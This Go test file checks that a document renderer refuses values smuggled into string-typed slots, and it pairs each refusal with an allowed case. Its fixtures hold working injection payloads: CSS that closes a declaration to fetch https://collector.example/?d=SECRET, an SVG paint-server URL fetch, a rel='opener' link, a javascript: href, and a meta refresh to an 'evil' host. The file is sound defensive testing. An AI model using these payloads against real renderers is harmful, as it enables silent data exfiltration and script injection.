package renderer

import (
	"strings"
	"testing"
)

// The emission grammar for string-typed slots, in EMITTED BYTES.
//
// WHAT IS UNDER TEST. A handful of wire slots are typed as a plain string and
// carry a grammar the type does not state — a CSS track-list (grid
// templateColumns), an SVG paint (a draw style's fill / stroke), and the two
// anchor token slots (link target / rel). This renderer concatenated
// templateColumns into a grid-template-columns declaration with no rule at all,
// so `;background:url(https://collector/?d=…)` closed the declaration, opened a
// second one the document never wrote, and fetched on RENDER with no user act —
// outside the egress policy that governs every href and src in the same
// document — while the React client dropped the identical value silently.
//
// Two disciplines, mirroring the sibling hosts' corpora so the hosts cannot
// drift on safety:
//
//  1. EVERY REFUSAL TEST HAS AN ALLOW TWIN. A gate that refuses everything
//     passes every refusal assertion ever written, so a corpus of refusals
//     alone cannot tell "the grammar works" from "the renderer is broken". The
//     allow twins are what go red if the grammar is tightened past what a
//     legitimate document says — which is why the named colour is in there.
//
//  2. THE RENDERED BYTES, THROUGH THE ORDINARY ENTRY POINT. Every render test
//     calls RenderHTML. A test that called SanitizeCSSValue directly and
//     asserted on its result would keep passing on the day someone removed the
//     call from the grid arm, which is precisely the failure this closes.

func TestGridTemplateColumnsRefusesAValueThatLeavesItsDeclaration(t *testing.T) {
	node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":2,"templateColumns":"1fr;background:url(https://collector.example/?d=SECRET)"},"role":"Group"}}`)
	html := renderHTML(t, node, nil)
	for _, forbidden := range []string{"collector.example", "SECRET", "url("} {
		if strings.Contains(html, forbidden) {
			t.Errorf("html leaked %q:\n%s", forbidden, html)
		}
	}
	if !strings.Contains(html, cssRefusalAttribute) {
		t.Errorf("the refusal is not marked in the document:\n%s", html)
	}
	// The marker carries the SLOT and never the value, the same bound every
	// other denial here keeps: a refused value is the payload.
	if !strings.Contains(html, `data-fuaran-css-refused="grid-template-columns"`) {
		t.Errorf("the marker does not name the slot:\n%s", html)
	}
}

func TestGridTemplateColumnsAllowTwins(t *testing.T) {
	// If these fail the grammar has become unusable rather than strict, and
	// every irregular grid in the estate is broken.
	cases := []string{"1fr 2fr auto", "repeat(auto-fit, minmax(150px, 1fr))", "min-content max-content"}
	for _, template := range cases {
		node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":2,"templateColumns":`+quote(template)+`},"role":"Group"}}`)
		html := renderHTML(t, node, nil)
		if !strings.Contains(html, "grid-template-columns:"+template) {
			t.Errorf("template %q was not emitted verbatim:\n%s", template, html)
		}
		if strings.Contains(html, cssRefusalAttribute) {
			t.Errorf("template %q was marked refused:\n%s", template, html)
		}
	}
}

func TestGridWithNoTemplateIsUnchangedFromBeforeTheGate(t *testing.T) {
	// The gate must be invisible where nothing declared anything. This fails if
	// sanitizeCSSValueForSlot ever starts rewriting rather than passing through.
	node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":3},"role":"Group"}}`)
	html := renderHTML(t, node, nil)
	if !strings.Contains(html, "grid-template-columns:repeat(3, 1fr)") {
		t.Errorf("the computed default changed:\n%s", html)
	}
	if strings.Contains(html, cssRefusalAttribute) {
		t.Errorf("an undeclared template was marked:\n%s", html)
	}
}

func TestDrawingPaintRefusesAPaintServerReference(t *testing.T) {
	// url(https://collector/x) contains no forbidden CHARACTER, so it passes the
	// generic CSS rule. In an SVG fill it names a paint server the user agent
	// FETCHES. Only a positive grammar excludes it, which is why the paint slots
	// have one.
	node := mustDecode(t, `{"id":"d","kind":{"$type":"Drawing","shapes":[{"$type":"Circle","cx":5,"cy":5,"r":2,"style":{"fill":{"$type":"Static","value":"url(https://collector.example/x)"}}}],"style":{},"viewBox":{"height":10,"minX":0,"minY":0,"width":10}}}`)
	html := renderHTML(t, node, nil)
	if strings.Contains(html, "collector.example") {
		t.Errorf("a paint server reference reached the document:\n%s", html)
	}
	if !strings.Contains(html, `fill="none"`) {
		t.Errorf("the refused paint is not `none` — an empty fill would INHERIT the group's paint:\n%s", html)
	}
}

func TestDrawingPaintAllowTwins(t *testing.T) {
	// The named colour is the load-bearing one. An enumerated keyword list
	// refuses `steelblue`, and its failure mode is silent: the shape is
	// repainted, not reported.
	for _, paint := range []string{"#39c", "#336699", "steelblue", "currentColor", "rgb(1 2 3)"} {
		node := mustDecode(t, `{"id":"d","kind":{"$type":"Drawing","shapes":[{"$type":"Circle","cx":5,"cy":5,"r":2,"style":{"fill":{"$type":"Static","value":`+quote(paint)+`}}}],"style":{},"viewBox":{"height":10,"minX":0,"minY":0,"width":10}}}`)
		html := renderHTML(t, node, nil)
		if !strings.Contains(html, `fill="`+paint+`"`) {
			t.Errorf("paint %q was not emitted verbatim:\n%s", paint, html)
		}
	}
}

func TestLinkAnchorTokensAreClosedAndTheSafePairIsForced(t *testing.T) {
	// The whole finding in one case. `opener` re-enables window.opener on a
	// _blank link, handing the opened document a live reference to this one —
	// and browsers imply noopener there, which is exactly why an explicit
	// `opener` mattered: it OVERRIDES a user-agent default no document can know
	// the version floor of.
	node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","rel":"opener","target":"_blank"}}`)
	html := renderHTML(t, node, nil)
	if !strings.Contains(html, `rel="noopener noreferrer"`) {
		t.Errorf("the safe pair is not forced:\n%s", html)
	}
	if !strings.Contains(html, `target="_blank"`) {
		t.Errorf("the legitimate target did not survive:\n%s", html)
	}
}

func TestLinkTargetOutsideTheClosedSetIsOmittedNotSubstituted(t *testing.T) {
	// Omitting says truthfully that the document declared nothing this renderer
	// could honour. Substituting _self would put a value in the DOM the author
	// never wrote, and the two are the same navigation anyway.
	for _, target := range []string{"victim", "_parent", "_top"} {
		node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","target":`+quote(target)+`}}`)
		html := renderHTML(t, node, nil)
		if strings.Contains(html, "target=") {
			t.Errorf("target %q was honoured:\n%s", target, html)
		}
		if strings.Contains(html, target) {
			t.Errorf("target %q reached the document:\n%s", target, html)
		}
	}
}

func TestLinkAnchorAllowTwins(t *testing.T) {
	node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","rel":"nofollow","target":"_self"}}`)
	html := renderHTML(t, node, nil)
	if !strings.Contains(html, `rel="nofollow"`) || !strings.Contains(html, `target="_self"`) {
		t.Errorf("a legitimate anchor did not survive:\n%s", html)
	}
	if strings.Contains(html, "noopener") {
		t.Errorf("nothing should be forced on a same-tab link:\n%s", html)
	}

	// A link declaring neither slot emits neither attribute — unchanged from
	// before the gate.
	bare := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About"}}`)
	bareHTML := renderHTML(t, bare, nil)
	if strings.Contains(bareHTML, "rel=") || strings.Contains(bareHTML, "target=") {
		t.Errorf("a bare link grew an attribute:\n%s", bareHTML)
	}
}

func TestMarkdownProtocolSweepIsTagAnchoredAndNameDelimited(t *testing.T) {
	// Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
	// hazard could not state it, because the literal token in a <code> element's
	// TEXT was replaced with about:blank. And an undelimited element match is a
	// match on a DIFFERENT element — <metadata> is not <meta>, and
	// <linearGradient> is not <link>, both of which the drawing builder emits.
	prose := sanitizeMarkdownHTML(`<p>Never write <code>javascript:</code> in an href</p>`)
	if !strings.Contains(prose, "javascript:") {
		t.Errorf("body text was rewritten:\n%s", prose)
	}

	attr := sanitizeMarkdownHTML(`<a href="javascript:alert(1)">x</a>`)
	if strings.Contains(attr, "javascript:") {
		t.Errorf("an attribute VALUE was not rewritten:\n%s", attr)
	}
	if !strings.Contains(attr, "about:blank") {
		t.Errorf("the refusal spelling is missing:\n%s", attr)
	}

	kept := sanitizeMarkdownHTML(`<p><meter value="0.6"></meter></p>`)
	if !strings.Contains(kept, "<meter") {
		t.Errorf("<meter> lost its opening tag to the <meta> sweep:\n%s", kept)
	}

	stripped := sanitizeMarkdownHTML(`<meta http-equiv="refresh" content="0;url=http://evil">`)
	if strings.Contains(stripped, "evil") {
		t.Errorf("a real <meta> survived:\n%s", stripped)
	}
}

func TestEmissionGrammarGoesRed(t *testing.T) {
	// Without this, a bug that made every CSS value empty for an unrelated
	// reason would read above as a gate working. These fail if the rule is
	// inverted, vacuous, or absent.
	if IsSafeCSSValue("1fr;background:url(x)") {
		t.Error("a value that leaves its declaration is not safe")
	}
	if !IsSafeCSSValue("clamp(1rem, 2vw, 3rem)") {
		t.Error("a function the denylist does not name must pass")
	}
	if IsSafeCSSValue("URL\n(x)") {
		t.Error("the function check must be whitespace-tolerant and case-insensitive")
	}
	if SanitizeCSSValue("a}b{color:red") != "" {
		t.Error("a brace-bearing value must not reach a stylesheet")
	}
	if SanitizePaintValue("url(#grad)") != "none" {
		t.Error("a local paint server is refused too")
	}
	target, rel := sanitizeLinkAnchor("_blank", "")
	if target != "_blank" || rel != "noopener noreferrer" {
		t.Errorf("the pair is not forced with no declared rel at all: (%q, %q)", target, rel)
	}
}

// quote renders a Go string as a JSON string literal for the fixture builders
// above. Deliberately not `strconv.Quote`: Go and JSON agree on the escapes
// these fixtures use, but they do not agree in general, and a fixture builder
// that silently produced not-quite-JSON would be a test failure attributed to
// the renderer.
func quote(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, ch := range s {
		switch ch {
		case '"':
			b.WriteString(`\"`)
		case '\\':
			b.WriteString(`\\`)
		default:
			b.WriteRune(ch)
		}
	}
	b.WriteByte('"')
	return b.String()
}
